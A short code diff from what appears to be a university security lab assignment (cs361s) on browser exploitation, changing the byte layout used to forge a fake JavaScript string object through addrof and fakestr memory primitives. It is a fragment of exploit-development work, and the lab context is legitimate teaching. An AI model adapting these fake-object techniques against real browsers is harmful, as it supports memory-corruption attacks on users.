@@ -2,7 +2,7 @@
  * TODO: Part B solution goes here!
  */
 let data = new Uint32Array(1);
-let strfront = String.fromCharCode(1, 0, 0, 0, 255, 255, 255, 1, 0, 0, 0, 0, 0, 0, 0, 0);
+let strfront = String.fromCharCode(1, 0, 0, 0, 0, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0);
 let fakestring = cs361s.fakestr(cs361s.addrof(strfront) + 16);
 
 // Here we are creating arrays for each condition where the address of the string is before of after the array
